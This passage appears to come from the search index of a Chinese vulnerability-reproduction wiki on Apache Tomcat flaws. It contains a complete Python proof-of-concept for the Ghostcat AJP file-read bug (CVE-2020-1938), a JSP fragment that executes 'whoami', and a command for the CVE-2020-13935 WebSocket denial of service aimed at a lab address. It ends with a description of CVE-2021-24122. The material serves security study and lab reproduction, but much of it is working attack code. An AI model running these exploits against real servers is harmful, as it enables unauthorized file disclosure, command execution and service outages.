java.io.InputStreamReader(Runtime.getRuntime().exec(\"whoami\").getInputStream())).readLine());%>","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Tomcat/Apache%20Tomcat%20AJP%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%20CVE-2020-1938/#\u6f0f\u6d1e\u5229\u7528poc","text":"https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/blob/master/CNVD-2020-10487-Tomcat-Ajp-lfi.py #!/usr/bin/env python #CNVD-2020-10487 Tomcat-Ajp lfi #by ydhcui import struct # Some references: # https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html def pack_string ( s ): if s is None : return struct . pack ( \">h\" , - 1 ) l = len ( s ) return struct . pack ( \">H %d sb\" % l , l , s . encode ( 'utf8' ), 0 ) def unpack ( stream , fmt ): size = struct . calcsize ( fmt ) buf = stream . read ( size ) return struct . unpack ( fmt , buf ) def unpack_string ( stream ): size , = unpack ( stream , \">h\" ) if size == - 1 : # null string return None res , = unpack ( stream , \" %d s\" % size ) stream . read ( 1 ) # \\0 return res class NotFoundException ( Exception ): pass class AjpBodyRequest ( object ): # server == web server, container == servlet SERVER_TO_CONTAINER , CONTAINER_TO_SERVER = range ( 2 ) MAX_REQUEST_LENGTH = 8186 def __init__ ( self , data_stream , data_len , data_direction = None ): self . data_stream = data_stream self . data_len = data_len self . data_direction = data_direction def serialize ( self ): data = self . data_stream . read ( AjpBodyRequest . MAX_REQUEST_LENGTH ) if len ( data ) == 0 : return struct . pack ( \">bbH\" , 0x12 , 0x34 , 0x00 ) else : res = struct . pack ( \">H\" , len ( data )) res += data if self . data_direction == AjpBodyRequest . SERVER_TO_CONTAINER : header = struct . pack ( \">bbH\" , 0x12 , 0x34 , len ( res )) else : header = struct . pack ( \">bbH\" , 0x41 , 0x42 , len ( res )) return header + res def send_and_receive ( self , socket , stream ): while True : data = self . serialize () socket . send ( data ) r = AjpResponse . receive ( stream ) while r . prefix_code != AjpResponse . GET_BODY_CHUNK and r . prefix_code != AjpResponse . SEND_HEADERS : r = AjpResponse . receive ( stream ) if r . prefix_code == AjpResponse . SEND_HEADERS or len ( data ) == 4 : break class AjpForwardRequest ( object ): _ , OPTIONS , GET , HEAD , POST , PUT , DELETE , TRACE , PROPFIND , PROPPATCH , MKCOL , COPY , MOVE , LOCK , UNLOCK , ACL , REPORT , VERSION_CONTROL , CHECKIN , CHECKOUT , UNCHECKOUT , SEARCH , MKWORKSPACE , UPDATE , LABEL , MERGE , BASELINE_CONTROL , MKACTIVITY = range ( 28 ) REQUEST_METHODS = { 'GET' : GET , 'POST' : POST , 'HEAD' : HEAD , 'OPTIONS' : OPTIONS , 'PUT' : PUT , 'DELETE' : DELETE , 'TRACE' : TRACE } # server == web server, container == servlet SERVER_TO_CONTAINER , CONTAINER_TO_SERVER = range ( 2 ) COMMON_HEADERS = [ \"SC_REQ_ACCEPT\" , \"SC_REQ_ACCEPT_CHARSET\" , \"SC_REQ_ACCEPT_ENCODING\" , \"SC_REQ_ACCEPT_LANGUAGE\" , \"SC_REQ_AUTHORIZATION\" , \"SC_REQ_CONNECTION\" , \"SC_REQ_CONTENT_TYPE\" , \"SC_REQ_CONTENT_LENGTH\" , \"SC_REQ_COOKIE\" , \"SC_REQ_COOKIE2\" , \"SC_REQ_HOST\" , \"SC_REQ_PRAGMA\" , \"SC_REQ_REFERER\" , \"SC_REQ_USER_AGENT\" ] ATTRIBUTES = [ \"context\" , \"servlet_path\" , \"remote_user\" , \"auth_type\" , \"query_string\" , \"route\" , \"ssl_cert\" , \"ssl_cipher\" , \"ssl_session\" , \"req_attribute\" , \"ssl_key_size\" , \"secret\" , \"stored_method\" ] def __init__ ( self , data_direction = None ): self . prefix_code = 0x02 self . method = None self . protocol = None self . req_uri = None self . remote_addr = None self . remote_host = None self . server_name = None self . server_port = None self . is_ssl = None self . num_headers = None self . request_headers = None self . attributes = None self . data_direction = data_direction def pack_headers ( self ): self . num_headers = len ( self . request_headers ) res = \"\" res = struct . pack ( \">h\" , self . num_headers ) for h_name in self . request_headers : if h_name . startswith ( \"SC_REQ\" ): code = AjpForwardRequest . COMMON_HEADERS . index ( h_name ) + 1 res += struct . pack ( \"BB\" , 0xA0 , code ) else : res += pack_string ( h_name ) res += pack_string ( self . request_headers [ h_name ]) return res def pack_attributes ( self ): res = b \"\" for attr in self . attributes : a_name = attr [ 'name' ] code = AjpForwardRequest . ATTRIBUTES . index ( a_name ) + 1 res += struct . pack ( \"b\" , code ) if a_name == \"req_attribute\" : aa_name , a_value = attr [ 'value' ] res += pack_string ( aa_name ) res += pack_string ( a_value ) else : res += pack_string ( attr [ 'value' ]) res += struct . pack ( \"B\" , 0xFF ) return res def serialize ( self ): res = \"\" res = struct . pack ( \"bb\" , self . prefix_code , self . method ) res += pack_string ( self . protocol ) res += pack_string ( self . req_uri ) res += pack_string ( self . remote_addr ) res += pack_string ( self . remote_host ) res += pack_string ( self . server_name ) res += struct . pack ( \">h\" , self . server_port ) res += struct . pack ( \"?\" , self . is_ssl ) res += self . pack_headers () res += self . pack_attributes () if self . data_direction == AjpForwardRequest . SERVER_TO_CONTAINER : header = struct . pack ( \">bbh\" , 0x12 , 0x34 , len ( res )) else : header = struct . pack ( \">bbh\" , 0x41 , 0x42 , len ( res )) return header + res def parse ( self , raw_packet ): stream = StringIO ( raw_packet ) self . magic1 , self . magic2 , data_len = unpack ( stream , \"bbH\" ) self . prefix_code , self . method = unpack ( stream , \"bb\" ) self . protocol = unpack_string ( stream ) self . req_uri = unpack_string ( stream ) self . remote_addr = unpack_string ( stream ) self . remote_host = unpack_string ( stream ) self . server_name = unpack_string ( stream ) self . server_port = unpack ( stream , \">h\" ) self . is_ssl = unpack ( stream , \"?\" ) self . num_headers , = unpack ( stream , \">H\" ) self . request_headers = {} for i in range ( self . num_headers ): code , = unpack ( stream , \">H\" ) if code > 0xA000 : h_name = AjpForwardRequest . COMMON_HEADERS [ code - 0xA001 ] else : h_name = unpack ( stream , \" %d s\" % code ) stream . read ( 1 ) # \\0 h_value = unpack_string ( stream ) self . request_headers [ h_name ] = h_value def send_and_receive ( self , socket , stream , save_cookies = False ): res = [] i = socket . sendall ( self . serialize ()) if self . method == AjpForwardRequest . POST : return res r = AjpResponse . receive ( stream ) assert r . prefix_code == AjpResponse . SEND_HEADERS res . append ( r ) if save_cookies and 'Set-Cookie' in r . response_headers : self . headers [ 'SC_REQ_COOKIE' ] = r . response_headers [ 'Set-Cookie' ] # read body chunks and end response packets while True : r = AjpResponse . receive ( stream ) res . append ( r ) if r . prefix_code == AjpResponse . END_RESPONSE : break elif r . prefix_code == AjpResponse . SEND_BODY_CHUNK : continue else : raise NotImplementedError break return res class AjpResponse ( object ): _ , _ , _ , SEND_BODY_CHUNK , SEND_HEADERS , END_RESPONSE , GET_BODY_CHUNK = range ( 7 ) COMMON_SEND_HEADERS = [ \"Content-Type\" , \"Content-Language\" , \"Content-Length\" , \"Date\" , \"Last-Modified\" , \"Location\" , \"Set-Cookie\" , \"Set-Cookie2\" , \"Servlet-Engine\" , \"Status\" , \"WWW-Authenticate\" ] def parse ( self , stream ): # read headers self . magic , self . data_length , self . prefix_code = unpack ( stream , \">HHb\" ) if self . prefix_code == AjpResponse . SEND_HEADERS : self . parse_send_headers ( stream ) elif self . prefix_code == AjpResponse . SEND_BODY_CHUNK : self . parse_send_body_chunk ( stream ) elif self . prefix_code == AjpResponse . END_RESPONSE : self . parse_end_response ( stream ) elif self . prefix_code == AjpResponse . GET_BODY_CHUNK : self . parse_get_body_chunk ( stream ) else : raise NotImplementedError def parse_send_headers ( self , stream ): self . http_status_code , = unpack ( stream , \">H\" ) self . http_status_msg = unpack_string ( stream ) self . num_headers , = unpack ( stream , \">H\" ) self . response_headers = {} for i in range ( self . num_headers ): code , = unpack ( stream , \">H\" ) if code <= 0xA000 : # custom header h_name , = unpack ( stream , \" %d s\" % code ) stream . read ( 1 ) # \\0 h_value = unpack_string ( stream ) else : h_name = AjpResponse . COMMON_SEND_HEADERS [ code - 0xA001 ] h_value = unpack_string ( stream ) self . response_headers [ h_name ] = h_value def parse_send_body_chunk ( self , stream ): self . data_length , = unpack ( stream , \">H\" ) self . data = stream . read ( self . data_length + 1 ) def parse_end_response ( self , stream ): self . reuse , = unpack ( stream , \"b\" ) def parse_get_body_chunk ( self , stream ): rlen , = unpack ( stream , \">H\" ) return rlen @staticmethod def receive ( stream ): r = AjpResponse () r . parse ( stream ) return r import socket def prepare_ajp_forward_request ( target_host , req_uri , method = AjpForwardRequest . GET ): fr = AjpForwardRequest ( AjpForwardRequest . SERVER_TO_CONTAINER ) fr . method = method fr . protocol = \"HTTP/1.1\" fr . req_uri = req_uri fr . remote_addr = target_host fr . remote_host = None fr . server_name = target_host fr . server_port = 80 fr . request_headers = { 'SC_REQ_ACCEPT' : 'text/html' , 'SC_REQ_CONNECTION' : 'keep-alive' , 'SC_REQ_CONTENT_LENGTH' : '0' , 'SC_REQ_HOST' : target_host , 'SC_REQ_USER_AGENT' : 'Mozilla' , 'Accept-Encoding' : 'gzip, deflate, sdch' , 'Accept-Language' : 'en-US,en;q=0.5' , 'Upgrade-Insecure-Requests' : '1' , 'Cache-Control' : 'max-age=0' } fr . is_ssl = False fr . attributes = [] return fr class Tomcat ( object ): def __init__ ( self , target_host , target_port ): self . target_host = target_host self . target_port = target_port self . socket = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) self . socket . setsockopt ( socket . SOL_SOCKET , socket . SO_REUSEADDR , 1 ) self . socket . connect (( target_host , target_port )) self . stream = self . socket . makefile ( \"rb\" , bufsize = 0 ) def perform_request ( self , req_uri , headers = {}, method = 'GET' , user = None , password = None , attributes = []): self . req_uri = req_uri self . forward_request = prepare_ajp_forward_request ( self . target_host , self . req_uri , method = AjpForwardRequest . REQUEST_METHODS . get ( method )) print ( \"Getting resource at ajp13:// %s : %d%s \" % ( self . target_host , self . target_port , req_uri )) if user is not None and password is not None : self . forward_request . request_headers [ 'SC_REQ_AUTHORIZATION' ] = \"Basic \" + ( \" %s : %s \" % ( user , password )) . encode ( 'base64' ) . replace ( ' \\n ' , '' ) for h in headers : self . forward_request . request_headers [ h ] = headers [ h ] for a in attributes : self . forward_request . attributes . append ( a ) responses = self . forward_request . send_and_receive ( self . socket , self . stream ) if len ( responses ) == 0 : return None , None snd_hdrs_res = responses [ 0 ] data_res = responses [ 1 : - 1 ] if len ( data_res ) == 0 : print ( \"No data in response. Headers: %s \\n \" % snd_hdrs_res . response_headers ) return snd_hdrs_res , data_res ''' javax.servlet.include.request_uri javax.servlet.include.path_info javax.servlet.include.servlet_path ''' import argparse parser = argparse . ArgumentParser () parser . add_argument ( \"target\" , type = str , help = \"Hostname or IP to attack\" ) parser . add_argument ( '-p' , '--port' , type = int , default = 8009 , help = \"AJP port to attack (default is 8009)\" ) parser . add_argument ( \"-f\" , '--file' , type = str , default = 'WEB-INF/web.xml' , help = \"file path :(WEB-INF/web.xml)\" ) args = parser . parse_args () t = Tomcat ( args . target , args . port ) _ , data = t . perform_request ( '/asdf' , attributes = [ { 'name' : 'req_attribute' , 'value' :[ 'javax.servlet.include.request_uri' , '/' ]}, { 'name' : 'req_attribute' , 'value' :[ 'javax.servlet.include.path_info' , args . file ]}, { 'name' : 'req_attribute' , 'value' :[ 'javax.servlet.include.servlet_path' , '/' ]}, ]) print ( '----------------------------' ) print ( \"\" . join ([ d . data for d in data ]))","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Tomcat/Apache%20Tomcat%20AJP%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%20CVE-2020-1938/#\u53c2\u8003\u6587\u7ae0","text":"Github\u5730\u5740 \u5a01\u80c1\u901a\u544a APACHE TOMCAT \u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\uff08CVE-2020-1938\uff09","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Tomcat/Apache%20Tomcat%20WebSocket%20%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%20CVE-2020-13935/","text":"Apache Tomcat WebSocket \u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e CVE-2020-13935 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 2020\u5e7411\u670806\u65e5\uff0c360CERT\u76d1\u6d4b\u53d1\u73b0 @RedTeamPentesting \u53d1\u5e03\u4e86 Tomcat WebSokcet \u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e \u7684\u5206\u6790\u62a5\u544a\uff0c\u8be5\u6f0f\u6d1e\u7f16\u53f7\u4e3a CVE-2020-13935 \uff0c\u6f0f\u6d1e\u7b49\u7ea7\uff1a \u9ad8\u5371 \uff0c\u6f0f\u6d1e\u8bc4\u5206\uff1a 7.5 \u3002 \u672a\u6388\u6743\u7684\u8fdc\u7a0b\u653b\u51fb\u8005\u901a\u8fc7\u53d1\u9001 \u5927\u91cf\u7279\u5236\u8bf7\u6c42\u5305 \u5230Tomcat\u670d\u52a1\u5668 ,\u53ef\u9020\u6210\u670d\u52a1\u5668\u505c\u6b62\u54cd\u5e94\u5e76\u65e0\u6cd5\u63d0\u4f9b\u6b63\u5e38\u670d\u52a1 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] Apache Tomcat 10.0.0-M1-10.0.0-M6 Apache Tomcat 9.0.0.M1-9.0.36 Apache Tomcat 8.5.0-8.5.56 Apache Tomcat 7.0.27-7.0.104 \u73af\u5883\u642d\u5efa \u00b6 https://github.com/vulhub/vulhub.git cd vulhub/tomcat/CVE-2020-1938 docker-compose up -d \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8bbf\u95ee\u76ee\u6807\uff0c\u67e5\u770b\u7248\u672c\u662f\u5426\u5728\u6f0f\u6d1e\u7248\u672c\u8303\u56f4\u5185 \u67e5\u770b\u653b\u51fb\u524d\u7684\u5185\u5b58\u4f7f\u7528\u60c5\u51b5 CVE-2020-13935 EXP\u5730\u5740 [!NOTE] EXP\u4f7f\u7528\u9700\u8981GO\u73af\u5883 \u5982\u679c\u51fa\u73b0 go : github . com / gorilla / websocket @ v1 .4.2 : Get \"https://proxy.golang.org/github.com/gorilla/websocket/@v/v1.4.2.mod\" : dial tcp 172.217.160.81 : 443 : connectex : A connection attempt failed because the connected party did not properly respond after a period of time , or established connection failed because connected host has failed to respond . \u9700\u8981\u4f7f\u7528\u547d\u4ee4\u5207\u6362\u6e90 go env -w GOPROXY=https://goproxy.cn \u4f7f\u7528EXP\u653b\u51fb tcdos ws://192.168.51.133:8080/examples/websocket/echoStreamAnnotation CPU \u8d1f\u8377\u8d85\u8f7d\uff0c\u6210\u529f\u653b\u51fb \u6f0f\u6d1e\u5229\u7528POC \u00b6 CVE-2020-13935 EXP\u5730\u5740","title":"Apache Tomcat WebSocket \u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e CVE-2020-13935"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Tomcat/Apache%20Tomcat%20WebSocket%20%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%20CVE-2020-13935/#apache-tomcat-websocket-\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e-cve-2020-13935","text":"","title":"Apache Tomcat WebSocket \u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e CVE-2020-13935"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Tomcat/Apache%20Tomcat%20WebSocket%20%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%20CVE-2020-13935/#\u6f0f\u6d1e\u63cf\u8ff0","text":"2020\u5e7411\u670806\u65e5\uff0c360CERT\u76d1\u6d4b\u53d1\u73b0 @RedTeamPentesting \u53d1\u5e03\u4e86 Tomcat WebSokcet \u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e \u7684\u5206\u6790\u62a5\u544a\uff0c\u8be5\u6f0f\u6d1e\u7f16\u53f7\u4e3a CVE-2020-13935 \uff0c\u6f0f\u6d1e\u7b49\u7ea7\uff1a \u9ad8\u5371 \uff0c\u6f0f\u6d1e\u8bc4\u5206\uff1a 7.5 \u3002 \u672a\u6388\u6743\u7684\u8fdc\u7a0b\u653b\u51fb\u8005\u901a\u8fc7\u53d1\u9001 \u5927\u91cf\u7279\u5236\u8bf7\u6c42\u5305 \u5230Tomcat\u670d\u52a1\u5668 ,\u53ef\u9020\u6210\u670d\u52a1\u5668\u505c\u6b62\u54cd\u5e94\u5e76\u65e0\u6cd5\u63d0\u4f9b\u6b63\u5e38\u670d\u52a1","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Tomcat/Apache%20Tomcat%20WebSocket%20%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%20CVE-2020-13935/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] Apache Tomcat 10.0.0-M1-10.0.0-M6 Apache Tomcat 9.0.0.M1-9.0.36 Apache Tomcat 8.5.0-8.5.56 Apache Tomcat 7.0.27-7.0.104","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Tomcat/Apache%20Tomcat%20WebSocket%20%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%20CVE-2020-13935/#\u73af\u5883\u642d\u5efa","text":"https://github.com/vulhub/vulhub.git cd vulhub/tomcat/CVE-2020-1938 docker-compose up -d","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Tomcat/Apache%20Tomcat%20WebSocket%20%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%20CVE-2020-13935/#\u6f0f\u6d1e\u590d\u73b0","text":"\u8bbf\u95ee\u76ee\u6807\uff0c\u67e5\u770b\u7248\u672c\u662f\u5426\u5728\u6f0f\u6d1e\u7248\u672c\u8303\u56f4\u5185 \u67e5\u770b\u653b\u51fb\u524d\u7684\u5185\u5b58\u4f7f\u7528\u60c5\u51b5 CVE-2020-13935 EXP\u5730\u5740 [!NOTE] EXP\u4f7f\u7528\u9700\u8981GO\u73af\u5883 \u5982\u679c\u51fa\u73b0 go : github . com / gorilla / websocket @ v1 .4.2 : Get \"https://proxy.golang.org/github.com/gorilla/websocket/@v/v1.4.2.mod\" : dial tcp 172.217.160.81 : 443 : connectex : A connection attempt failed because the connected party did not properly respond after a period of time , or established connection failed because connected host has failed to respond . \u9700\u8981\u4f7f\u7528\u547d\u4ee4\u5207\u6362\u6e90 go env -w GOPROXY=https://goproxy.cn \u4f7f\u7528EXP\u653b\u51fb tcdos ws://192.168.51.133:8080/examples/websocket/echoStreamAnnotation CPU \u8d1f\u8377\u8d85\u8f7d\uff0c\u6210\u529f\u653b\u51fb","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Tomcat/Apache%20Tomcat%20WebSocket%20%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%20CVE-2020-13935/#\u6f0f\u6d1e\u5229\u7528poc","text":"CVE-2020-13935 EXP\u5730\u5740","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Tomcat/Apache%20Tomcat%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2021-24122/","text":"Apache Tomcat \u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e CVE-2021-24122 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u4f7f\u7528NTFS\u6587\u4ef6\u7cfb\u7edf\u4ece\u7f51\u7edc\u4f4d\u7f6e\u63d0\u4f9b\u8d44\u6e90\u65f6\uff0cApache Tomcat\u7248\u672c10.0.0-M1\u81f310.0.0-M9\u30019.0.0.0.M1\u81f39.0.39\u30018.5.0\u81f38.5.59\u548c7.0.0\u81f37.0.106\u5728\u67d0\u4e9b\u914d\u7f6e\u4e2d\u5bb9\u6613\u53d7\u5230JSP\u6e90\u4ee3\u7801\u516c\u5f00\u7684\u5f71\u54cd\u3002\u6839\u672c\u539f\u56e0\u662fJRE API File.getCanonicalPath\uff08\uff09\u7684\u610f\u5916\u884c\u4e3a\uff0c\u8fd9\u53c8\u662f\u7531Windows API\uff08FindFirstFileW\uff09\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\u7684\u4e0d\u4e00\u81f4\u884c\u4e3a\u5f15\u8d77\u7684\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] Apache Tomcat 10.0.0-M1-10.0.0-M9 Apache Tomcat 9.0.0.M1-9.0.39 Apache Tomcat 8.5.0-8.5.59 Apache Tomcat 7.0.0-7.0.106 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u76ee\u524d\u6f0f\u6d1e\u590d\u73b0\u6682\u672a\u5b8c\u5584 \u00b6 \u66f4\u65b0\u8865\u4e01\u5982\u4e0b \u636e\u5b98\u65b9\u63cf\u8ff0\uff0c\u8be5\u6f0f\u6d1e\u7531\u4e8eWindows API\uff08FindFirstFileW\uff09\u4e0eJRE API File.getCanonicalPath\u7684\u4e00\u4e9b\u610f\u5916\u884c\u4e3a\u6240\u5bfc\u81f4\u3002\u5f53\u4f7f\u7528NTFS\u6587\u4ef6\u7cfb\u7edf\u65f6\uff0c\u53ef\u4ee5\u7ed5\u8fc7\u4e00\u4e9b\u5b89\u5168\u9650\u5236\uff0c\u6700\u7ec8\u53ef\u5bfc\u81f4\u5982\u67e5\u770b\u67d0\u4e9b\u914d\u7f6e\u4e2dJSP\u7684\u6e90\u4ee3\u7801\u7b49\u5371\u5bb3\u3002 \u800c\u8865\u4e01\u4fee\u590d\u4e86 \u51fa\u73b0 : \u7684\u90e8\u5206 getCanonicalPath() \u6b64\u8def\u5f84\u65b9\u6cd5\u8fd4\u56de\u7edd\u5bf9\u552f\u4e00\u7684\u6807\u51c6\u89c4\u8303\u8def\u5f84\u540d\u3002\u6b64\u65b9\u6cd5\u9996\u5148\u5c06\u6b64\u8def\u5f84\u540d\u8f6c\u6362\u4e3a\u7edd\u5bf9\u5f62\u5f0f\uff0c\u5c31\u50cf\u8c03\u7528getAbsolutePath\u65b9\u6cd5\u4e00\u6837\uff0c\u7136\u540e\u4ee5\u7cfb\u7edf\u76f8\u5173\u7684\u65b9\u5f0f\u5c06\u5176\u6620\u5c04\u5230\u5176\u552f\u4e00\u8def\u5f84\u4e0a\u3002 \u4e5f\u5c31\u662f\u8bf4\u5982\u679c\u8def\u5f84\u4e2d\u5305\u542b\u201c.\u201d\u6216\u201c..\u201d\u7b49\u5f53\u524d\u8def\u5f84\u53ca\u4e0a\u5c42\u8def\u5f84\u8868\u793a\u6cd5\uff0c\u5219\u4f1a\u4ece\u8def\u5f84\u540d\u4e2d\u5220\u9664\u201c.\u201d\u548c\u201c..\u201d\u4f7f\u7528\u771f\u5b9e\u8def\u5f84\u4ee3\u66ff\u3002\u53e6\u5916\u6bd4\u8f83\u91cd\u70b9\u7684\u662f \u5b83\u8fd8\u4f1a\u89e3\u6790\u8f6f\u94fe\u63a5\uff08\u5728UNIX\u5e73\u53f0\u4e0a\uff09\u4ee5\u53ca\u5c06\u9a71\u52a8\u5668\u53f7\uff08\u5728Microsoft Windows\u5e73\u53f0\u4e0a\uff09\uff0c\u5c06\u5b83\u4eec\u8f6c\u6362\u4e3a\u6807\u51c6\u5b9e\u9645\u8def\u5f84\u3002 \u800c getCanonicalPath() \u89e3\u6790\u4e86\u8f6f\u94fe\u63a5\u8f6c\u6362\u4e3a\u5b9e\u9645\u8def\u5f84\u5bfc\u81f4\u6f0f\u6d1e\u7684\u4ea7\u751f","title":"Apache Tomcat \u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e CVE-2021-24122"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Tomcat/Apache%20Tomcat%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2021-24122/#apache-tomcat-\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e-cve-2021-24122","text":"","title":"Apache Tomcat \u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e CVE-2021-24122"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Tomcat/Apache%20Tomcat%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2021-24122/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u4f7f\u7528NTFS\u6587\u4ef6\u7cfb\u7edf\u4ece\u7f51\u7edc\u4f4d\u7f6e\u63d0\u4f9b\u8d44\u6e90\u65f6\uff0cApache Tomcat\u7248\u672c10.0.0-M1\u81f310.0.0-M9\u30019.0.0.0.M1\u81f39.0.39\u30018.5.0\u81f38.5.59\u548c7.0.0\u81f37.0.106\u5728\u67d0\u4e9b\u914d\u7f6e\u4e2d\u5bb9\u6613\u53d7\u5230JSP\u6e90\u4ee3\u7801\u516c\u5f00\u7684\u5f71\u54cd\u3002\u6839\u672c\u539f\u56e0\u662fJRE API File.getCanonicalPath\uff08\uff09\u7684\u610f\u5916\u884c\u4e3a\uff0c\u8fd9\u53c8\u662f\u7531Windows API\uff08FindFirstFileW\uff09\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\u7684\u4e0d\u4e00\u81f4\u884c\u4e3a\u5f15\u8d77\u7684\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Tomcat/Apache%20Tomcat%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2021-24122/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] Apache Tomcat 10.0.0-M1-10.0.0-M9 Apache Tomcat 9.0.0.M1-9.0.39 Apache Tomcat 8.5.0-8.5.59 Apache Tomcat 7.0.0-7.0.106","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Tomcat/Apache%20Tomcat%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2021-24122/#\u6f0f\u6d1e\u590d\u73b0","text":"","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Tomcat/Apache%20Tomcat%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2021-24122/#\u76ee\u524d\u6f0f\u6d1e\u590d\u73b0\u6682\u672a\u5b8c\u5584","text":"\u66f4\u65b0\u8865\u4e01\u5982\u4e0b \u636e\u5b98\u65b9\u63cf\u8ff0\uff0c\u8be5\u6f0f\u6d1e\u7531\u4e8eWindows API\uff08FindFirstFileW\uff09\u4e0eJRE API 